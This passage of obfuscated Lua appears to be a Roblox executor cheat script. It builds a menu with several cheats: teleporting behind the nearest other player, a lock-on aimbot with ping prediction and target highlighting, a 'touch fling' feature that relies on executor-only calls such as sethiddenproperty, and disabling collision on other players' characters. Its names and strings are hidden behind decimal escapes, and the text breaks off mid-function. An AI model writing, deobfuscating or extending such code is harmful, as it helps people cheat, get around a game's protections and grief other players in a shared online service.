 local function _lIllIlIIll(exceptActive, animIdFilter) local _IlIlIIIlIl = not exceptActive and _llIlIlIlIl(_llIIIlIIll) if _IlIlIIIlIl then _IlIlIIIlIl = _lIllIlIIlI(_llIlIlIlIl(_llIIIlIIll)) end
 if _IlIlIIIlIl then if animIdFilter then for _lllIlllIIl, stopTrack in pairs(_IlIlIIIlIl:GetPlayingAnimationTracks()) do if typeof(animIdFilter) ~= "\116\097\098\108\101" then if stopTrack.Animation.AnimationId:match(tostring(animIdFilter):match("\037\100\043")) then stopTrack:Stop() end
 else for _lllIlllIIl, stopAnimId in pairs(animIdFilter) do if stopTrack.Animation.AnimationId:match(tostring(stopAnimId):match("\037\100\043")) then stopTrack:Stop() end
 end
 end
 end
 else for _lllIlllIIl, stopTrack2 in pairs(_IlIlIIIlIl:GetPlayingAnimationTracks()) do stopTrack2:Stop() end
 end
 end
 end
 local function _lIllIlllIl() local _IIIlllIlll = _llIlIlIlIl(_llIIIlIIll) if not _IIIlllIlll then return nil end
 _IIIlllIlll = _IIIlllIlll:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101", 0x1) return _IIIlllIlll end
 local function _IIIIIIlIll(eventData) local _IIlIIllllI = _lIllIlllIl() if _IIlIIllllI then _IIlIIllllI:FireServer(eventData) end
 end
 local function _IIIIIIllII(instance, newInstance) task.wait() local _lIIlIllIlI = instance.Parent instance:Destroy() if newInstance then warn("\073\110\115\116\097\110\099\101\032\114\101\109\111\118\101\100\044\032\078\097\109\101\058", instance.Name, "\067\108\097\115\115\078\097\109\101\058", instance.ClassName, "\080\097\114\101\110\116\058", _lIIlIllIlI) end
 end
 local function _IlIllIIIlI(_IIlIllIllI) local _IlIllIllll = (typeof(_IIlIllIllI) == "\073\110\115\116\097\110\099\101" and _IIlIllIllI:IsA("\077\111\100\101\108")) and _IIlIllIllI or _llIlIlIlIl(_IIlIllIllI) local _IIlIIlIlII = _IlIllIllll and _llIlIlllII(_IlIllIllll) or _IlIllIllll return _IlIllIllll and _IIlIIlIlII and _IIlIIlIlII.Velocity.Magnitude >= 0x7D0 and true or false end
 local function _IlIlllIIIl(excludeFF, maxDist) local _lllIIIlIlI = _llIlIlIlIl(_llIIIlIIll) local _IllIlIlIII = _lllIIIlIlI and _llIlIlllII(_lllIIIlIlI) or _lllIIIlIlI local _llIlIIIllI = nil if _lllIIIlIlI and _IllIlIlIII then local _llllllllll = math.huge local _IIllllllIl = {} for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do table.insert(_IIllllllIl, _IIIIIlIlll) end
 local _lIlIllllII = workspace:FindFirstChild("\076\105\118\101") if _lIlIllllII then for _lllIlllIIl, _llllIIIIIl in ipairs(_lIlIllllII:GetChildren()) do if _llllIIIIIl:IsA("\077\111\100\101\108") and _llllIIIIIl:FindFirstChild("\072\117\109\097\110\111\105\100") then table.insert(_IIllllllIl, _llllIIIIIl) end
 end
 end
 for _lllIlllIIl, mouseTPPlayer in ipairs(_IIllllllIl) do local _lIlIllllll = (mouseTPPlayer == _llIIIlIIll) or (typeof(mouseTPPlayer) == "\073\110\115\116\097\110\099\101" and mouseTPPlayer:IsA("\077\111\100\101\108") and mouseTPPlayer == _llIIIlIIll.Character) local _IlIllIllll = (typeof(mouseTPPlayer) == "\073\110\115\116\097\110\099\101" and mouseTPPlayer:IsA("\077\111\100\101\108")) and mouseTPPlayer or _llIlIlIlIl(mouseTPPlayer) if not _lIlIllllll and _IlIllIllll then local _lIIllIIIII = _IlIllIllll local _IIIIlIIIIl = _lIIllIIIII and _llIlIlllII(_lIIllIIIII) or _lIIllIIIII local _lIIIIIlllI = _lIIllIIIII and _lIllIlIIlI(_lIIllIIIII) or _lIIllIIIII if _lIIllIIIII and _IIIIlIIIIl and _lIIIIIlllI and _lIIIIIlllI.Health ~= 0x0 and workspace.CurrentCamera then local _llIlIIlIII = nil if excludeFF then local _IlllllIlIl = workspace.CurrentCamera:WorldToViewportPoint(_IIIIlIIIIl.Position) _llIlIIlIII = (Vector2.new(_IlllllIlIl.X, _IlllllIlIl.Y) - _lIlIIlIlII:GetMouseLocation()).Magnitude else _llIlIIlIII = (_IllIlIlIII.Position - _IIIIlIIIIl.Position).Magnitude end
 if _llIlIIlIII < _llllllllll then if maxDist then if not _IlIllIIIlI(mouseTPPlayer) then _llllllllll = _llIlIIlIII _llIlIIIllI = mouseTPPlayer end
 else _llllllllll = _llIlIIlIII _llIlIIIllI = mouseTPPlayer end
 end
 end
 end
 end
 end
 return _llIlIIIllI end
 local function _llllllllIl() local _IIIllllIll, bestStreakPlayer = 0x0, nil for _lllIlllIIl, streakPlayer in pairs(Players:GetPlayers()) do local _lIlllIIllI = _llIlIlIlIl(streakPlayer) local _IIlllllIll = _lIlllIIllI and (_lIlllIIllI:GetAttribute("\067\117\114\114\101\110\116\083\116\114\101\097\107") or 0x0) or 0x0 if _lIlllIIllI and _IIIllllIll < _IIlllllIll then bestStreakPlayer = streakPlayer _IIIllllIll = _IIlllllIll end
 end
 return bestStreakPlayer end
 local _lIIIIIlllI = _IIIIlIIIll _lIIIIIlllI:AddToggle("\065\110\105\109\101\084\101\108\101\112\111\114\116\097\116\105\111\110", { Text = "\065\110\105\109\101\032\084\101\108\101\112\111\114\116\097\116\105\111\110", Default = false, Callback = function (_lIllIlIIll) end
 , }) _lIIIIIlllI:AddLabel("\065\110\105\109\101\032\084\101\108\101\112\111\114\116\097\116\105\111\110\032\075\101\121\098\105\110\100"):AddKeyPicker("\065\110\105\109\101\084\080\075\101\121\098\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\084", Text = "\065\110\105\109\101\032\084\101\108\101\112\111\114\116\097\116\105\111\110", Callback = function () _IlIllIIllI.AnimeTPKeybind.Toggled = false if not _IIlIlIIlIl.AnimeTeleportation or not _IIlIlIIlIl.AnimeTeleportation.Value then return end
 local _IIlIIIIIll = _llIlIlIlIl(_llIIIlIIll) local _IllIIIlIIl = _IIlIIIIIll and _llIlIlllII(_IIlIIIIIll) or _IIlIIIIIll local _IlIlllIIlI = _IIlIIIIIll and _lIllIlIIlI(_IIlIIIIIll) or _IIlIIIIIll if not (_IIlIIIIIll and _IllIIIlIIl and _IlIlllIIlI) then return end
 local _lllIIIlIII = getgenv()._revenantTPMode or (_IlIllIIllI.AnimeTPMode and _IlIllIIllI.AnimeTPMode.Value) or "\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101" local _IIlIIIlIII = nil if _lllIIIlIII == "\083\105\108\101\110\116\032\076\111\099\107" then local _lIlllIIIIl, closestDist = nil, math.huge for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll then local _lIlIIIIlII = _IIIIIlIlll.Character local _llllIIlllI = _lIlIIIIlII and _lIlIIIIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIlIllIIlI = _lIlIIIIlII and _lIlIIIIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIIIlII and _llllIIlllI and _IIlIllIIlI and _IIlIllIIlI.Health > 0x0 then local _IlllllIlIl, onScreen = workspace.CurrentCamera:WorldToViewportPoint(_llllIIlllI.Position) if onScreen then local _lIIlIlIlIl = _lIlIIlIlII:GetMouseLocation() local _IIIlllIlIl = (Vector2.new(_IlllllIlIl.X, _IlllllIlIl.Y) - _lIIlIlIlIl).Magnitude if _IIIlllIlIl < closestDist then closestDist = _IIIlllIlIl _lIlllIIIIl = _llllIIlllI end
 end
 end
 end
 end
 if _lIlllIIIIl then _IIlIIIlIII = CFrame.new(_lIlllIIIIl.CFrame.Position - _lIlllIIIIl.CFrame.LookVector * 0x5, _lIlllIIIIl.CFrame.Position) end
 else if _lIlIlIIIIl.Target then local _lIIlIlIlII = _IllIIIlIIl.CFrame _IIlIIIlIII = CFrame.new( _lIlIlIIIIl.Hit.Position, Vector3.new(_lIIlIlIlII.Position.X, _lIlIlIIIIl.Hit.Position.Y, _lIIlIlIlII.Position.Z) ) * CFrame.Angles(0x0, math.pi, 0x0) end
 end
 if not _IIlIIIlIII then return end
 _lIllIlIIll(_IlIlllIIlI, {"\049\053\057\053\055\051\054\049\051\051\057"}) if _IIlIlIIlIl.AnimeTPAnimation.Value then local _lllIIlIIll = _lIllIIIIII(_IlIlllIIlI, "\049\053\057\053\055\051\054\049\051\051\057") _lllIIlIIll.Priority = Enum.AnimationPriority.Action2 _lllIIlIIll:Play() _lllIIlIIll:AdjustSpeed(_IlIllIIllI.AnimeTPSpeed.Value) end
 _lIllllIlIl(_IIlIIIlIII) local _llIlllIIII = _IlIllIIllI.AnimeTPSound.Value if _llIlllIIII == "\071\111\107\117" then local _llllllIIII = _lIllIlllII(_IllIIIlIIl, "\052\056\054\049\054\051\056\057\056\050") _llllllIIII.Volume = _IlIllIIllI.AnimeTPVolume.Value / 0xA _llllllIIII:Play() elseif _llIlllIIII == "\071\111\107\117\032\066\108\097\099\107" then local _lIllIIIIII = _lIllIlllII(_IllIIIlIIl, "\057\048\049\048\050\050\049\056\052\056") _lIllIIIIII.Volume = _IlIllIIllI.AnimeTPVolume.Value / 0xA _lIllIIIIII:Play() _lIllIIIIII.TimePosition = 0.4 end
 pcall( function () local _IlIllIllII = _IllIIllIII.Resources.KJEffects.tpthing:Clone() _IlIllIllII.Parent = _IllIIIlIIl _IlIllIllII:Emit(0xF) _lIllIIIlIl:AddItem(_IlIllIllII, 0x1) end
 ) for _lllIlllIIl, _IIIllllIll in pairs(_IIlIIIIIll:GetDescendants()) do if _IIIllllIll:IsA("\066\097\115\101\080\097\114\116") and _IIIllllIll ~= _IllIIIlIIl and _IIIllllIll.Transparency ~= 0x1 and not _IIIllllIll.Name:lower():find("\104\105\116\098\111\120") then task.spawn( function () _IIIllllIll.Transparency = 0x1 task.delay(0.1, function () if getgenv().desync and not _IIlIIIIIll:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then _IIIllllIll.Transparency = 0.5 else _IIIllllIll.Transparency = 0x0 end
 end
 ) local _llllIlllll = _IIIllllIll:FindFirstChildWhichIsA("\068\101\099\097\108") if _llllIlllll and _llllIlllll.Transparency ~= 0x1 then local _lIlllIIIII = _llllIlllll.Transparency _llllIlllll.Transparency = 0x1 task.wait(0.1) _llllIlllll.Transparency = _lIlllIIIII end
 end
 ) end
 end
 end
 , }) _lIIIIIlllI:AddToggle("\065\110\105\109\101\084\080\065\110\105\109\097\116\105\111\110", { Text = "\084\101\108\101\112\111\114\116\032\065\110\105\109\097\116\105\111\110", Default = false, }) table.insert(_llIlllIlIl, function () pcall( function () _IIlIlIIlIl.AnimeTeleportation:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.AnimeTPAnimation:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.TP1:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.TP2:SetValue(false) end
 ) end
 ) _lIIIIIlllI:AddDropdown("\065\110\105\109\101\084\080\083\111\117\110\100", { Values = {"\078\111\110\101", "\071\111\107\117", "\071\111\107\117\032\066\108\097\099\107"}, Default = 0x1, Multi = false, Text = "\084\101\108\101\112\111\114\116\032\083\111\117\110\100", }) _lIIIIIlllI:AddSlider("\065\110\105\109\101\084\080\086\111\108\117\109\101", { Text = "\083\111\117\110\100\032\086\111\108\117\109\101", Default = 0xA, Min = 0x1, Max = 0xA, Rounding = 0x1, }) _lIIIIIlllI:AddSlider("\065\110\105\109\101\084\080\083\112\101\101\100", { Text = "\065\110\105\109\097\116\105\111\110\032\083\112\101\101\100", Default = 0x1, Min = 0.5, Max = 0x5, Rounding = 0x1, }) if not (_lIlIIlIlII.TouchEnabled and not _lIlIIlIlII.KeyboardEnabled) then _lIIIIIlllI:AddDropdown("\065\110\105\109\101\084\080\077\111\100\101", { Text = "\084\080\032\077\111\100\101", Values = { "\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101", "\083\105\108\101\110\116\032\076\111\099\107" }, Default = 0x1, Multi = false, Callback = function (_lIllIlIIll) getgenv()._revenantTPMode = _lIllIlIIll end
 , }) _lIIIIIlllI:AddLabel("\080\114\101\115\115\032\070\051\032\116\111\032\113\117\105\099\107\108\121\032\115\119\105\116\099\104\032\098\101\116\119\101\101\110\032\116\101\108\101\112\111\114\116\032\109\111\100\101\115\046", true) _lIlIIIIIll[#_lIlIIIIIll+0x1] = _lIlIIlIlII.InputBegan:Connect( function (input, gp) if gp then return end
 if input.KeyCode == Enum.KeyCode.F3 then local _IIlIIIlIlI = _IlIllIIllI.AnimeTPMode and _IlIllIIllI.AnimeTPMode.Value if _IIlIIIlIlI == "\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101" then getgenv()._revenantTPMode = "\083\105\108\101\110\116\032\076\111\099\107" pcall( function () _IlIllIIllI.AnimeTPMode:SetValue("\083\105\108\101\110\116\032\076\111\099\107") end
 ) _IllIIlIIll:Notify({ Title = "\065\110\105\109\101\032\084\080", Content = "\077\111\100\101\058\032\083\105\108\101\110\116\032\076\111\099\107", _IllIIlIlll = 0x2 }) else getgenv()._revenantTPMode = "\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101" pcall( function () _IlIllIIllI.AnimeTPMode:SetValue("\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101") end
 ) _IllIIlIIll:Notify({ Title = "\065\110\105\109\101\032\084\080", Content = "\077\111\100\101\058\032\084\101\108\101\112\111\114\116\032\116\111\032\077\111\117\115\101", _IllIIlIlll = 0x2 }) end
 end
 end
 ) end
 if _lIlIIlIlII.TouchEnabled and not _lIlIIlIlII.KeyboardEnabled then _lIIIIIlllI:AddButton({ Text = "\065\110\105\109\101\032\084\101\108\101\112\111\114\116\097\116\105\111\110", Func = function () local _lIIllIIllI = _llIIIlIIll.Character local _IIIlIIIllI = _lIIllIIllI and _lIIllIIllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIlllIllll = _lIIllIIllI and _lIIllIIllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_lIIllIIllI and _IIIlIIIllI and _lIlllIllll) then return end
 local _lIlllIIIIl, closestDist = nil, math.huge local _IIIIllIIll = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 0x2, workspace.CurrentCamera.ViewportSize.Y / 0x2) for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll then local _lIlIIIIlII = _IIIIIlIlll.Character local _llllIIlllI = _lIlIIIIlII and _lIlIIIIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIlIllIIlI = _lIlIIIIlII and _lIlIIIIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIIIlII and _llllIIlllI and _IIlIllIIlI and _IIlIllIIlI.Health > 0x0 then local _IlllllIlIl, onScreen = workspace.CurrentCamera:WorldToViewportPoint(_llllIIlllI.Position) if onScreen then local _IIIlllIlIl = (Vector2.new(_IlllllIlIl.X, _IlllllIlIl.Y) - _IIIIllIIll).Magnitude if _IIIlllIlIl < closestDist then closestDist = _IIIlllIlIl _lIlllIIIIl = _llllIIlllI end
 end
 end
 end
 end
 if _lIlllIIIIl then _lIllIlIIll(_lIlllIllll, {"\049\053\057\053\055\051\054\049\051\051\057"}) if _IIlIlIIlIl.AnimeTPAnimation.Value then local _IIlIIllIIl = _lIllIIIIII(_lIlllIllll, "\049\053\057\053\055\051\054\049\051\051\057") _IIlIIllIIl.Priority = Enum.AnimationPriority.Action2 _IIlIIllIIl:Play() _IIlIIllIIl:AdjustSpeed(_IlIllIIllI.AnimeTPSpeed.Value) end
 local _IIlIIIlIII = CFrame.new(_lIlllIIIIl.CFrame.Position - _lIlllIIIIl.CFrame.LookVector * 0x5, _lIlllIIIIl.CFrame.Position) _lIllllIlIl(_IIlIIIlIII) end
 end
 , }) end
 _lIIIIIlllI:AddToggle("\076\111\099\107\045\111\110", { Text = "\076\111\099\107\045\111\110", Default = false, Callback = function (lockOnVal) if not lockOnVal then if _IlIllIIllI["\076\045\079\110\075\101\121\098\105\110\100"]:GetState() == true then _IlIllIIllI["\076\045\079\110\075\101\121\098\105\110\100"].Toggled = false _IlIllIIllI["\076\045\079\110\075\101\121\098\105\110\100"]:DoClick() else _IlIllIIllI["\076\045\079\110\075\101\121\098\105\110\100"].Toggled = false end
 end
 end
 , }):AddKeyPicker("\076\045\079\110\075\101\121\098\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\086", Text = "\076\111\099\107\045\111\110", Callback = function (lockOnRangeVal) if _lIllIlllll["\076\111\099\107\045\111\110"] then return end
 if lockOnRangeVal and not _IIlIlIIlIl["\076\111\099\107\045\111\110"].Value then RunService.RenderStepped:Wait() _lIllIlllll["\076\111\099\107\045\111\110"] = true _IlIllIIllI["\076\045\079\110\075\101\121\098\105\110\100"].Toggled = false _IlIllIIllI["\076\045\079\110\075\101\121\098\105\110\100"]:DoClick() _lIllIlllll["\076\111\099\107\045\111\110"] = false return end
 local _IlIIIIIIll = _IlIlllIIIl(true) if _IlIIIIIIll and lockOnRangeVal and _IIlIlIIlIl["\076\111\099\107\045\111\110"].Value then while true do local _llllIlIIlI = _llIlIlIlIl(_llIIIlIIll) local _llIIIIIllI = _llllIlIIlI and _llIlIlllII(_llllIlIIlI) or _llllIlIIlI local _IllIIIlllI = _llllIlIIlI and _lIllIlIIlI(_llllIlIIlI) or _llllIlIIlI local _lllIIlIIll = _IlIIIIIIll and _llIlIlIlIl(_IlIIIIIIll) or _IlIIIIIIll local _llIIllIIlI = _lllIIlIIll and _llIlIlllII(_lllIIlIIll) or _lllIIlIIll local _lllIlllIll = _lllIIlIIll and _lIllIlIIlI(_lllIIlIIll) or _lllIIlIIll if _llllIlIIlI and _llIIIIIllI and _IllIIIlllI and _IlIIIIIIll and _lllIIlIIll and _llIIllIIlI and _lllIlllIll and _IllIIIlllI.Health > 0x0 then _IllIIIlllI.AutoRotate = false local _IlIIIIllll = _lllIIlIIll:FindFirstChildWhichIsA("\072\105\103\104\108\105\103\104\116") or Instance.new("\072\105\103\104\108\105\103\104\116", _lllIIlIIll) _IlIIIIllll.FillTransparency = 0.8 _IlIIIIllll.OutlineTransparency = 0x0 _IlIIIIllll.DepthMode = "\065\108\119\097\121\115\079\110\084\111\112" _IlIIIIllll.FillColor = Color3.fromRGB(0xFF, 0x0, 0x0) _IlIIIIllll.OutlineColor = Color3.fromRGB(0xFF, 0x0, 0x0) local _IIlIlIIllI = _llIIIIIllI.Position local _IlIlIIlIIl = _llIIllIIlI.Position local _lllIIllIIl = _IIlIlIIlIl["\065\117\116\111\095\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"].Value and _lIIlIIlllI.Network.ServerStatsItem["\068\097\116\097\032\080\105\110\103"]:GetValue() / 0x3E8 or _IlIllIIllI["\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"].Value and _lIIlIIlllI.Network.ServerStatsItem["\068\097\116\097\032\080\105\110\103"]:GetValue() / 0x3E8 or _IlIllIIllI["\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"].Value local _IllIlllIll = Vector3.new(_IlIlIIlIIl.X, _IlIIlIllIl.Flying and _IlIlIIlIIl.Y or _IIlIlIIllI.Y, _IlIlIIlIIl.Z) + _lllIlllIll.MoveDirection * _llIIllIIlI.Velocity.Magnitude * 0.1 if _IIlIlIIlIl["\065\117\116\111\095\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"].Value then _IlIllIIllI["\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110"]:SetValue(tonumber(string.format("\037\046\049\102", _lllIIllIIl))) end
 if not _llllIlIIlI:FindFirstChild("\082\097\103\100\111\108\108") then _llIIIIIllI.CFrame = CFrame.new(_IIlIlIIllI, _IllIlllIll) end
 end
 RunService.RenderStepped:Wait() if _IlIllIIllI["\076\045\079\110\075\101\121\098\105\110\100"]:GetState() == false or (_IlIIIIIIll and not _IlIIIIIIll.Parent) or not _IlIIIIIIll then local _lIlIIIIllI = _llIlIlIlIl(_llIIIlIIll) local _lllIlllIIl = _lIlIIIIllI and _llIlIlllII(_lIlIIIIllI) or _lIlIIIIllI local _llIIIlllIl = _lIlIIIIllI and _lIllIlIIlI(_lIlIIIIllI) or _lIlIIIIllI if _lIlIIIIllI and _lllIlllIIl and _llIIIlllIl then _llIIIlllIl.AutoRotate = true end
 local _IlIllllllI = _IlIIIIIIll and _llIlIlIlIl(_IlIIIIIIll) or _IlIIIIIIll local _lIllIlIIlI = _IlIllllllI and _IlIllllllI:FindFirstChildWhichIsA("\072\105\103\104\108\105\103\104\116") or _IlIllllllI if _IlIIIIIIll and _IlIllllllI and _lIllIlIIlI then if _llllllllIl() ~= _IlIIIIIIll or (0xA > (_IlIllllllI:GetAttribute("\067\117\114\114\101\110\116\083\116\114\101\097\107") or 0x0) or _IlIIIIIIll:GetAttribute("\083\095\072\105\100\101\083\116\114\101\097\107")) then _lIllIlIIlI.FillTransparency = 0x1 _lIllIlIIlI.OutlineTransparency = 0x1 _lIllIlIIlI.DepthMode = "\079\099\099\108\117\100\101\100" _lIllIlIIlI.FillColor = Color3.fromRGB(0xFF, 0xFF, 0xFF) _lIllIlIIlI.OutlineColor = Color3.fromRGB(0xFF, 0xFF, 0xFF) else _lIllIlIIlI.FillTransparency = 0x1 _lIllIlIIlI.OutlineTransparency = 0x0 _lIllIlIIlI.DepthMode = "\079\099\099\108\117\100\101\100" _lIllIlIIlI.FillColor = Color3.fromRGB(0xFF, 0xFF, 0x0) _lIllIlIIlI.OutlineColor = Color3.fromRGB(0xFF, 0xFF, 0x0) end
 end
 break end
 end
 else return end
 end
 , }) _lIIIIIlllI:AddSlider("\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110", { Text = "\080\114\101\100\105\099\116\105\111\110", Default = 0.1, Min = 0.1, Max = 0x1, Rounding = 0x1, Compact = true, }) _lIIIIIlllI:AddToggle("\065\117\116\111\095\076\111\099\107\045\111\110\095\080\114\101\100\105\099\116\105\111\110", { Text = "\065\117\116\111\032\080\114\101\100\105\099\116\105\111\110", Default = false, }) _lIIIIIlllI:AddDivider() local _lIlIIlIlII = {} local _IIIllllIll = nil local function _lllIlIIIlI(_IIllllIlII) if not _IIllllIlII then return end
 for _lllIlllIIl, _llIIIIlllI in pairs(_IIllllIlII:GetDescendants()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") then _llIIIIlllI.CanCollide = false end
 end
 end
 _lIIIllIlll = function () for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll then _lIlIIlIlII[_IIIIIlIlll] = _IIIIIlIlll.CharacterAdded:Connect( function (_IIllllIlII) task.wait(0.1) _lllIlIIIlI(_IIllllIlII) end
 ) end
 end
 _lIlIIlIlII["\095\097\100\100\101\100"] = Players.PlayerAdded:Connect( function (_IIIIIlIlll) task.wait(0.1) _lIlIIlIlII[_IIIIIlIlll] = _IIIIIlIlll.CharacterAdded:Connect( function (_IIllllIlII) task.wait(0.1) _lllIlIIIlI(_IIllllIlII) end
 ) end
 ) _IIIllllIll = RunService.Heartbeat:Connect( function () for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll and _IIIIIlIlll.Character then for _lllIlllIIl, _llIIIIlllI in pairs(_IIIIIlIlll.Character:GetDescendants()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") and _llIIIIlllI.CanCollide then _llIIIIlllI.CanCollide = false end
 end
 end
 end
 end
 ) end
 _lIIlIlllIl = function () if _IIIllllIll then _IIIllllIll:Disconnect() _IIIllllIll = nil end
 for _lllIlllIIl, _IllIIIllII in pairs(_lIlIIlIlII) do pcall( function () _IllIIIllII:Disconnect() end
 ) end
 table.clear(_lIlIIlIlII) for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll and _IIIIIlIlll.Character then for _lllIlllIIl, _llIIIIlllI in pairs(_IIIIIlIlll.Character:GetDescendants()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") then _llIIIIlllI.CanCollide = true end
 end
 end
 end
 end
 local _IIllIlIlII = nil local _lIlllIIIll = nil local _llIlllllII = nil _IIIIlIIIll:AddToggle("\084\111\117\099\104\070\108\105\110\103\069\110\097\098\108\101\100", { Text = "\084\111\117\099\104\032\070\108\105\110\103", Tooltip = "\066\101\116\116\101\114\032\119\105\116\104\032\065\110\116\105\045\070\108\105\110\103", Default = false, Callback = function (_lIllIlIIll) if getgenv()._revenantRaknetActive then getgenv()._raknetSavedTF = _lIllIlIIll return end
 if not _lIllIlIIll then _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] = false if _IIllIlIlII then pcall(_IIllIlIlII) end
 if _lIlllIIIll then pcall( function () _lIlllIIIll:Disconnect() end
 ) _lIlllIIIll = nil end
 if _IlIllIIllI.TouchFlingBind:GetState() == true then _IlIllIIllI.TouchFlingBind.Toggled = false _IlIllIIllI.TouchFlingBind:DoClick() end
 else if _llIlllllII and not _lIlllIIIll then pcall(_llIlllllII) end
 end
 end
 , }):AddKeyPicker("\084\111\117\099\104\070\108\105\110\103\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\088", Text = "\084\111\117\099\104\032\070\108\105\110\103", Callback = function (_IIIIIlIlll) if _IllllIllll.TF then return end
 if _IIIIIlIlll and not _IIlIlIIlIl.TouchFlingEnabled.Value then RunService.RenderStepped:Wait() _IllllIllll.TF = true; _IlIllIIllI.TouchFlingBind.Toggled = false; _IlIllIIllI.TouchFlingBind:DoClick(); _IllllIllll.TF = false return end
 if getgenv()._revenantRaknetActive then getgenv()._raknetSavedTF = _IIIIIlIlll _IllIIlIIll:Notify({ Title = "\084\111\117\099\104\032\070\108\105\110\103", Content = _IIIIIlIlll and "\084\111\103\103\108\101\100\032\111\110\032\9989" or "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IllIIlIlll = 0x2 }) return end
 if _IIlIlIIlIl.TouchFlingEnabled.Value then _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] = _IIIIIlIlll if not _IIIIIlIlll and _IIllIlIlII then pcall(_IIllIlIlII) end
 _IllIIlIIll:Notify({ Title = "\084\111\117\099\104\032\070\108\105\110\103", Content = _IIIIIlIlll and "\084\111\103\103\108\101\100\032\111\110\032\9989" or "\084\111\103\103\108\101\100\032\111\102\102\032\10060", _IllIIlIlll = 0x2 }) end
 end
 , }) local function _IlIllIIllI(visible) for _lllIlllIIl, key in ipairs({"\084\111\117\099\104\070\108\105\110\103\088","\084\111\117\099\104\070\108\105\110\103\089","\084\111\117\099\104\070\108\105\110\103\090","\084\111\117\099\104\070\108\105\110\103\088\073\110\112\117\116","\084\111\117\099\104\070\108\105\110\103\089\073\110\112\117\116","\084\111\117\099\104\070\108\105\110\103\090\073\110\112\117\116"}) do pcall( function () if _IlIllIIllI[key] and _IlIllIIllI[key].SetVisible then _IlIllIIllI[key]:SetVisible(visible) end
 end
 ) end
 end
 local _lIIllIllll = _llIllllllI _IIIIlIIIll:AddDropdown("\084\111\117\099\104\070\108\105\110\103\077\101\116\104\111\100", { Text = "\077\101\116\104\111\100", Values = { "\078\111\114\109\097\108" , "\068\101\097\116\104"}, Default = 0x1, Multi = false, Callback = function (_lIllIlIIll) _IlIllIIllI(_lIllIlIIll == "\078\111\114\109\097\108") end
 , }) do local _llIIIIIlII = 0x4 local _lIlllIlIIl = false local _IllllIIllI = nil local function _IIIIIlIIII(_IIllllIlII) if _lIlllIlIIl then return end
 if _IllllIIllI then pcall( function () _IllllIIllI:Disconnect() end
 ) _IllllIIllI = nil end
 local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII then return end
 _IllllIIllI = _IlIIIlIIII.Died:Connect( function () pcall( function () _IllllIIllI:Disconnect() end
 ) _IllllIIllI = nil local _IIIlIIllII = _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] = true task.wait(0.5) _IlIIlIllIl["\084\111\117\099\104\032\070\108\105\110\103"] = _IIIlIIllII end
 ) end
 _IIIIIlIIII(_llIIIlIIll.Character) _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) _lIlllIlIIl = true end
 ) local _IlIllllllI = nil local _IIlllIIlll = nil local _lllIIlllIl = false local function _llllIIIIll() local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIIIll = _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _lIIIIlIIlI = _IIlllIIlll _lllIIlllIl = false _IIlllIIlll = nil if _IlIIIIIIll and not _lllllIIIIl then pcall( function () sethiddenproperty(_IlIIIIIIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _IlIllllllI then pcall( function () sethiddenproperty(_IlIllllllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _IlIllllllI.Anchored = true end
 ) pcall( function () _IlIllllllI.AssemblyLinearVelocity = Vector3.zero end
